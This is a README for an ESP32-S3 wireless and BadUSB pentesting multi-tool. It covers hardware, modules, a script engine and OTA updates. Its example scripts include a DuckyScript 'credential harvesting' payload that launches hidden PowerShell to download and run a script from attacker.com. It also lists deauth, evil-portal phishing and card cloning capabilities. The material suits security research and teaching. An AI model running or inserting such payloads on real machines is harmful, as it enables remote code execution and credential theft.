# ESP-Chain

A modular ESP32-S3 based penetration testing multi-tool for wireless security research and hardware hacking.

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Hardware](#hardware)
  - [Core Hardware](#core-hardware)
  - [Expansion Modules](#expansion-modules)
  - [Full Hardware BOM](#full-hardware-bom)
- [Capabilities](#capabilities)
- [Architecture](#architecture)
  - [Modular Design](#modular-design)
  - [Script Engine](#script-engine)
  - [Firmware Updates](#firmware-updates)
- [Software](#software)
  - [Prerequisites](#prerequisites)
  - [Installation](#installation)
  - [Building](#building)
- [Usage](#usage)
  - [Menu System](#menu-system)
  - [Writing Scripts](#writing-scripts)
  - [Example Scripts](#example-scripts)
- [Module Documentation](#module-documentation)
- [Frequency Coverage](#frequency-coverage)
- [SD Card Structure](#sd-card-structure)
- [OTA Updates](#ota-updates)
- [Development](#development)
  - [Adding New Modules](#adding-new-modules)
  - [Contributing](#contributing)
- [Legal Disclaimer](#legal-disclaimer)
- [License](#license)
- [Acknowledgments](#acknowledgments)

---

## Overview

ESP-Chain is a keychain-sized wireless penetration testing tool built on the ESP32-S3 platform. Inspired by devices like the Flipper Zero, HackRF Portapack, and USB Rubber Ducky, ESP-Chain combines multiple attack vectors into a single, portable, and expandable platform.

The project emphasizes:

- **Modularity:** Easy to add new capabilities without recompiling
- **Extensibility:** Script-based payload system for community contributions
- **Portability:** Keychain form factor with integrated battery
- **Self-sufficiency:** SD card storage, offline operation, OTA updates

## Features

**Core Capabilities**

- BadUSB/HID Attacks: Native USB HID emulation (keyboard/mouse)
- WiFi Security: Scanning, deauth, packet capture, wardriving with GPS
- Bluetooth: BLE scanning, device enumeration
- RFID/NFC: Card cloning, emulation (13.56 MHz & 125 kHz)
- SubGHz RF: Signal capture/replay (315 MHz, 433 MHz, 868/915 MHz)
- Infrared: IR remote capture and transmission
- LoRa: Long-range command & control, mesh networking
- 2.4 GHz: Wireless keyboard/mouse sniffing and injection (NRF24L01+)

**Platform Features**

- Full-color TFT display: Real-time status and interactive menus
- Script engine: Load and execute attack scripts from SD card without recompilation
- OTA updates: Self-updating firmware via WiFi or SD card
- GPS logging: Wardriving with geolocation
- IMU sensor: Motion-based triggers and gesture controls
- Battery powered: Portable LiPo with onboard charging
- Expandable GPIO: Additional modules can be added

## Hardware

### Core Hardware

| Component | Model | Purpose |
|---|---:|---|
| Microcontroller | LILYGO T-Display-S3 (ESP32-S3) | Main processor with built-in display |
| Display | 1.9" ST7789 LCD (170x320) | User interface |
| Storage | MicroSD card module (SPI) | Script storage, logs, captured data |
| Battery | 3.7V LiPo (500-1000mAh) | Portable power with onboard charging |

**ESP32-S3 Key Features:**

- Dual-core Xtensa 240 MHz processor
- 512 KB SRAM, 8 MB Flash
- Native USB OTG (BadUSB support)
- WiFi 802.11 b/g/n
- Bluetooth 5.0 LE
- Hardware encryption

### Expansion Modules

ESP-Chain's modular architecture allows you to add only the modules you need.

**RF & Wireless Modules**

| Module | Frequency | Purpose | Interface | Price |
|---|---:|---|---|---:|
| CC1101 (433 MHz) | 387-464 MHz | EU garage doors, weather stations, doorbells | SPI | $3-5 |
| CC1101 (868/915 MHz) | 779-928 MHz | ISM band, sensors, LoRaWAN | SPI | $3-5 |
| RYLR689 | 868/915 MHz | Long-range LoRa communication, C2, mesh | SPI | $3-5 |
| NRF24L01+ | 2.4 GHz | Wireless keyboard/mouse sniffing & injection | SPI | $1-3 |


**Sensors & Input**

| Module | Purpose | Interface | Price |
|---|---|---|---:|
| M100 | GPS module for wardriving | UART | $5-12 |
| Rotary Encoder | Menu navigation | GPIO | $1-2 |
| Vibration Motor | Haptic feedback | GPIO | $0.50 |

### Full Hardware BOM

**Minimum Configuration (~$20):**

- 1x LILYGO T-Display-S3
- 1x MicroSD card module
- 1x MicroSD card (8-16 GB)
- 1x 500 mAh LiPo battery

**Recommended Configuration (~$50):**

- Above +
- 1x CC1101 433 MHz module
- 1x NRF24L01+ module
- 1x GPS module

**Maximum Configuration (~$80):**

- All of the above +
- 1x RYLR689 LoRa module
- 1x Rotary encoder
- 1x Vibration motor

## Capabilities

### BadUSB / HID Attacks

- DuckyScript interpreter: Run Rubber Ducky payloads
- Multi-platform: Windows, macOS, Linux payloads
- Keystroke injection: Fast, reliable HID emulation
- Scriptable: Load payloads from SD card
- Use cases: Credential harvesting, reverse shells, pranks

### WiFi Security

- Network scanning: Discover nearby access points
- Deauthentication: Disconnect clients from APs
- Packet capture: Save handshakes for offline cracking
- Evil portal: Captive portal credential phishing
- Wardriving: GPS-tagged network mapping
- Use cases: Penetration testing, network analysis

### SubGHz RF

- Signal capture: Record 433 MHz transmissions
- Signal replay: Retransmit captured signals
- Frequency scanning: Discover active frequencies
- Rolling code: Attempt to capture/replay (educational)
- Use cases: Car key research, garage door analysis

### LoRa Communication

- Long-range C2: Remote command & control (1-5 km)
- Mesh networking: Deploy multiple ESP-Chain nodes(beta meshtastic integration)
- Payload delivery: Remote script/firmware updates
- Use cases: Red team operations, IoT research, Communication

### 2.4 GHz (NRF24L01+)

- Wireless keyboard sniffing: Capture keystrokes
- Mouse tracking: Monitor wireless mouse data
- Injection attacks: Send keystrokes to wireless keyboards
- Use cases: Wireless peripheral security research

## Architecture

### Modular Design

ESP-Chain uses a plugin-based architecture where each capability is a self-contained module.

Project layout:

```
ESP-Chain/
├── src/
│   ├── main.cpp                 # Main entry point
│   ├── core/
│   │   ├── menu_system.cpp      # Menu navigation & UI
│   │   ├── display_manager.cpp  # TFT display handling
│   │   ├── sd_manager.cpp       # SD card operations
│   │   ├── config_manager.cpp   # JSON config loader
│   │   └── script_engine.cpp    # Script interpreter
│   ├── modules/                 # Pluggable modules
│   │   ├── badusb/
│   │   │   ├── badusb_module.cpp
│   │   │   └── ducky_parser.cpp
│   │   ├── wifi/
│   │   │   ├── wifi_scanner.cpp
│   │   │   └── wifi_deauth.cpp
│   │   ├── subghz/
│   │   │   ├── cc1101_driver.cpp
│   │   │   └── signal_capture.cpp
│   │   ├── lora/
│   │   │   ├── lora_c2.cpp
│   │   │   └── mesh_network.cpp
│   │   └── nrf24/
│   │       └── nrf24_sniffer.cpp
│   └── ui/
│       ├── icons.h               # UI icons/sprites
│       └── themes.h              # Color themes
├── include/
│   └── module_base.h            # Base class for modules
└── lib/                         # External libraries
```

**Module Base Class:**

```cpp
class Module {
public:
  virtual void init() = 0;                          // Initialize hardware
  virtual void loop() = 0;                          // Main loop
  virtual String getName() = 0;                     // Module name
  virtual String getDescription() = 0;              // Short description
  virtual void drawMenu(TFT_eSPI &tft) = 0;         // Draw module UI
  virtual void handleInput(uint8_t button) = 0;    // Handle user input
  virtual ~Module() {}
};
```

This allows new modules to be added without modifying core code.

### Script Engine

ESP-Chain includes a custom script interpreter that allows users to write and execute attack sequences without recompiling firmware.

**Script Format (.dks - ESP-Chain Script):**

```
# Example: WiFi + BadUSB attack
LOG Starting combined attack
WIFI_SCAN
DELAY 5000
WIFI_SAVE_RESULTS /logs/networks.txt
BADUSB /payloads/windows_reverse_shell.txt
DELAY 10000
LOG Attack completed
```

**Supported Commands:**

- `BADUSB <payload>` - Execute BadUSB payload
- `WIFI_SCAN` - Scan for WiFi networks
- `WIFI_DEAUTH <target>` - Deauth attack
- `SUBGHZ_SCAN <freq>` - Scan SubGHz frequency
- `SUBGHZ_REPLAY <file>` - Replay captured signal
- `LORA_SEND <message>` - Send LoRa message
- `DELAY <ms>` - Wait milliseconds
- `LOG <message>` - Write to log file
- `EXEC <script>` - Execute another script (nested)

Users can add scripts to SD card and run them immediately - no compilation required.

### Firmware Updates

ESP-Chain supports multiple update methods:

- WiFi OTA: Check GitHub releases or custom server for updates
- SD Card: Copy `firmware.bin` to SD card, auto-update on boot
- Web Interface: Connect to ESP-Chain's WiFi hotspot and upload via browser
- Dual Partition: Safe updates with automatic rollback on failure

**Update workflow:**

```
User → Downloads firmware.bin → Copies to SD card → Insert → Reboot → Auto-update
```

No computer or USB cable required.

## Software

### Prerequisites

**Option 1: Arduino IDE**

- Arduino IDE 2.x
- ESP32 board support (Espressif)
- Required libraries (see `platformio.ini`)

**Option 2: PlatformIO (Recommended)**

- VS Code with PlatformIO extension
- Automatic dependency management

### Installation

```bash
# Clone repository
git clone https://github.com/matt3r0p3rator/ESP-Chain.git
cd ESP-Chain

# Option 1: PlatformIO
pio run -t upload

# Option 2: Arduino IDE
# Open ESP-Chain.ino and upload via IDE
```

### Building

```bash
# Build firmware
pio run

# Upload via USB
pio run -t upload

# Upload via OTA
pio run -t upload --upload-port 192.168.4.1

# Build filesystem (SD card data)
pio run -t buildfs

# Generate firmware.bin for distribution
pio run
# Output: .pio/build/lilygo-t-display-s3/firmware.bin
```

## Usage

### Menu System

ESP-Chain features an intuitive scrolling menu system:

```
ESP-Chain v1.0.0
━━━━━━━━━━━━━━━━━━━━
→ BadUSB
  WiFi Tools
  SubGHz RF
  LoRa C2
  NRF24 Tools
  Settings
  About
━━━━━━━━━━━━━━━━━━━━
Battery: 87% | Active: (Script/Something happening in BG)
```

**Navigation:**

- Encoder Up/Down: Scroll Through Menu
- Encoder Press: Select
- Button On T-Display: Back/Esc

### Writing Scripts

Create a new script:

- Create a `.dks` file on your computer
- Add commands (see Script Engine section)
- Copy to SD card `/scripts/` folder
- Access from ESP-Chain menu

**Example: `car_key_capture.dks`**

```bash
# Scan for 315 MHz car key signals
LOG Starting car key capture
SUBGHZ_SELECT 315
SUBGHZ_SCAN 310 320 0.01
DELAY 30000
SUBGHZ_SAVE /captures/car_key_001.sub
LOG Capture complete
```

### Example Scripts

**Windows Credential Harvesting (`payloads/windows_creds.txt` - DuckyScript format):**

```bash
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/harvest.ps1')"
ENTER
```

**WiFi Wardriving (`scripts/wardriving.dks`):**

```bash
LOG Starting wardriving session
GPS_START
WIFI_SCAN_CONTINUOUS
DELAY 300000
WIFI_SAVE_RESULTS /logs/wardriving_$(DATE).csv
GPS_STOP
LOG Session complete
```

**RFID Clone Workflow (`scripts/rfid_workflow.dks`):**

```bash
LOG Place original card on reader
RFID_READ
DELAY 2000
RFID_SAVE /cards/access_card_$(DATE).dump
LOG Remove original, place blank card
DELAY 5000
RFID_CLONE /cards/access_card_$(DATE).dump
LOG Clone complete
```

## Frequency Coverage

ESP-Chain can operate across a wide range of frequencies:

| Frequency | Module | Use Cases |
|---|---|---|
| 433 MHz | CC1101-433 | EU garage doors, weather stations, doorbells |
| 915 MHz | RMF95W | LoRa |
| 2.4 GHz | ESP32 (WiFi/BT), NRF24L01+ | WiFi, Bluetooth, wireless keyboards/mice |

## SD Card Structure

```
/
├── config.json              # Main device configuration
├── modules/                 # Module-specific configs
│   ├── badusb.json
│   ├── wifi.json
│   └── rfid.json
├── payloads/                # BadUSB payloads
│   ├── windows/
│   │   ├── reverse_shell.txt
│   │   ├── cred_dump.txt
│   │   └── keylogger.txt
│   ├── linux/
│   │   └── backdoor.txt
│   └── mac/
│       └── exfil.txt
├── scripts/                 # ESP-Chain scripts (.dks)
│   ├── wifi_attack.dks
│   └── subghz_scan.dks
├── captures/                # Captured RF signals
│   ├── car_key_001.sub
│   ├── garage_door_002.sub
│   └── remote_003.sub
├── cards/
│   ├── access_card_001.dump
│   └── hotel_key_002.dump
├── logs/                    # Attack logs
│   ├── attack_log_2025-12-18.txt
│   └── wardriving_2025-12-18.csv
└── firmware.bin             # Place here for auto-update
```

**`config.json` example:**

```json
{
  "device": {
    "name": "ESP-Chain",
    "version": "1.0.0",
    "modules_enabled": ["badusb", "wifi", "subghz", "lora"]
  },
  "display": {
    "brightness": 128,
    "timeout_seconds": 30,
    "theme": "green_matrix"
  },
  "wifi": {
    "auto_scan": true,
    "save_handshakes": true,
    "deauth_reason": 7
  },
  "badusb": {
    "default_delay_ms": 100,
    "auto_execute": false
  },
  "lora": {
    "frequency": 915000000,
    "spreading_factor": 7,
    "bandwidth": 125000,
    "tx_power": 22
  }
}
```

## OTA Updates

### Method 1: GitHub Auto-Update

ESP-Chain automatically checks GitHub releases:

- Connect to WiFi
- Navigate to Settings → Check for Updates
- ESP-Chain downloads latest `firmware.bin` from releases
- Installs and reboots automatically

### Method 2: SD Card Update

- Download `firmware.bin` from releases
- Copy to SD card root as `/firmware.bin`
- Insert SD card into ESP-Chain
- Reboot - auto-update starts
- Firmware file is deleted after successful update

### Method 3: Web Interface

- ESP-Chain creates WiFi hotspot: `ESP-Chain-Update`
- Connect to hotspot (password: `esp-chain123`)
- Navigate to `http://192.168.4.1`
- Upload `firmware.bin` via web form
- Auto-reboot after upload

## Development

### Adding New Modules

Create module class example:

```cpp
// src/modules/my_module/my_module.cpp
#include "module_base.h"

class MyModule : public Module {
public:
  void init() override {
    // Initialize hardware
    Serial.println("MyModule initialized!");
  }
  
  String getName() override { return "My Module"; }
  
  String getDescription() override { return "Does something cool"; }
  
  void drawMenu(TFT_eSPI &tft) override {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("My Module Menu", 10, 10);
  }
  
  void handleInput(uint8_t button) override {
    // Handle button presses
  }
  
  void loop() override {
    // Main loop logic
  }
};
```

Register module in `main.cpp`:

```cpp
#include "modules/my_module/my_module.cpp"

void setup() {
  moduleManager.registerModule(new MyModule());
}
```

Add script commands (optional):

```cpp
// In script_engine.cpp
else if (line.startsWith("MY_COMMAND ")) {
  myModule->doSomething(line.substring(11));
}
```

### Contributing

Contributions are welcome! Please:

- Fork the repository
- Create a feature branch (`git checkout -b feature/amazing-feature`)
- Commit your changes (`git commit -m 'Add amazing feature'`)
- Push to the branch (`git push origin feature/amazing-feature`)
- Open a Pull Request

**Contribution ideas:**

- New modules (Zigbee, Z-Wave, SDR, etc.)
- Additional script commands
- UI improvements
- Payload libraries
- Documentation
- Bug fixes

## Legal Disclaimer

ESP-Chain is intended for authorized security research, penetration testing, and educational purposes ONLY.

**Important Legal Warnings:**

- Unauthorized access to computer systems, networks, or devices is illegal in most jurisdictions.
- Using ESP-Chain against systems you do not own or have explicit permission to test may violate local laws and regulations.
- RF transmission may be regulated: transmitting on certain frequencies without a license may be illegal and power levels may be restricted.
- RFID/NFC cloning: cloning access cards you don't own is illegal and using cloned cards for unauthorized access is illegal.

**Responsible Use:**

**Do:**

- Use on your own devices and networks
- Use in authorized penetration testing engagements
- Use for security research with proper permissions
- Use for educational purposes in controlled environments
- Check local laws before building or using

**Don't:**

- Attack networks, devices, or systems without permission
- Clone cards that don't belong to you
- Transmit on regulated frequencies without proper licensing
- Use in malicious or illegal activities
- Distribute captured credentials or data

By building, modifying, or using ESP-Chain, you accept full responsibility for your actions. The authors and contributors are not responsible for any misuse or damage caused by this tool.

## License

This project is licensed under the MIT License - see the `LICENSE` file for details.

**TL;DR:** You can use, modify, and distribute this project freely, but provide attribution and include the license. No warranty is provided.

## Acknowledgments

ESP-Chain builds upon the work of many open-source projects and the security research community.

**Inspiration:**

- Flipper Zero - Modular pentesting tool
- WiFi Pineapple - WiFi security platform
- USB Rubber Ducky - BadUSB attacks
- HackRF - Software-defined radio

**Key Projects:**

- ESP32 Marauder - WiFi/BT security suite
- Bruce - ESP32 multi-tool
- WiFiDuck - Wireless BadUSB
- FlipperZero Firmware - Modular architecture inspiration

**Libraries:**

- TFT_eSPI - Display driver
- ELECHOUSE_CC1101 - SubGHz transceiver
- RF24 - NRF24L01+ driver
- Arduino-LoRa - LoRa communication
- TinyGPS++ - GPS parsing

**Community:**

Security researchers worldwide, the ESP32 community, and open-source contributors.

**Project Stats**

![GitHub stars](https://img.shields.io/github/stars/matt3r0p3rator/ESP-Chain?style=social) ![GitHub forks](https://img.shields.io/github/forks/matt3r0p3rator/ESP-Chain?style=social) ![GitHub issues](https://img.shields.io/github/issues/matt3r0p3rator/ESP-Chain) ![GitHub license](https://img.shields.io/github/license/matt3r0p3rator/ESP-Chain)

Built by the security research community.

---

**ASCII Art Banner**

```

        Modular Pentesting Multi-Tool
              ESP32-S3 Platform
```

*Remember: With great power comes great responsibility. Use ESP-Chain ethically and legally.*
